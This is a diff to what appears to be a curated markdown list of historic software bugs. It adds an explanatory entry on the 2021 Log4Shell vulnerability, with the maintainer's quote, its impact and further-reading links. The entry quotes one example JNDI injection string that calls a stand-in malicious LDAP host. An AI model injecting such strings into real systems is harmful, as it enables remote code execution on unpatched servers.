@@ -42,6 +42,7 @@ A curated list of bugs, problems and failures that developers may find useful to
   - [Rachel True's Problem On iCloud](#rachel-trues-problem-on-icloud)
   - [The MySpace Worm (Samy Worm)](#the-myspace-worm-samy-worm)
   - [The PHP Hack that Broke Password Hashing](#the-php-hack-that-broke-password-hashing)
+  - [Log4Shell - The Vulnerability That Broke the Internet](#log4shell---the-vulnerability-that-broke-the-internet)
 - [AI](#ai)
   - [Microsoft's Tay Chatbot (2016)](#microsofts-tay-chatbot-2016)
 - [Translations](#translations)
@@ -449,6 +450,23 @@ Further readings;
 
 - [https://bugs.php.net/bug.php?id=81744](https://bugs.php.net/bug.php?id=81744)
 - [https://github.com/php/php-src/security/advisories/GHSA-7fj2-8×79-rjf4](https://github.com/php/php-src/security/advisories/GHSA-7fj2-8×79-rjf4)
+
+### Log4Shell - The Vulnerability That Broke the Internet
+
+> Literally all Java applications in the world could be affected. Even 10% would be a major problem. This would be catastrophic.
+>
+> [Christian Grobmeier, Log4j maintainer](https://github.blog/open-source/inside-the-breach-that-broke-the-internet-the-untold-story-of-log4shell/)
+
+In December 2021, a security researcher discovered a critical vulnerability in Log4j. The vulnerability, dubbed Log4Shell (CVE-2021-44228), received a perfect 10 CVSS score - the highest possible rating. The exploit was frighteningly simple: attackers could execute remote code by injecting a malicious JNDI string into any logged input field, such as usernames, search boxes, or even Minecraft chat messages.
+
+The vulnerability exploited Log4j's feature that allowed loading software components from remote servers through Java's Naming and Directory Interface (JNDI), but the library didn't validate whether these lookup strings came from trusted sources. A simple string like `${jndi:ldap://malicious-server.com/exploit}` could compromise entire systems.
+
+Log4Shell affected billions of devices across Fortune 500 companies, government systems, and popular applications like Minecraft. The incident exposed the hidden human cost of maintaining critical open source infrastructure, as volunteer maintainers found themselves responsible for patching a vulnerability affecting half the internet. The crisis led to initiatives like the GitHub Secure Open Source Fund to better support and secure critical open source projects.
+
+Further readings:
+
+- [Inside the breach that broke the internet: The untold story of Log4Shell](https://github.blog/open-source/inside-the-breach-that-broke-the-internet-the-untold-story-of-log4shell/)
+- [Log4Shell vulnerability](https://en.wikipedia.org/wiki/Log4Shell)
 
 ## AI
 
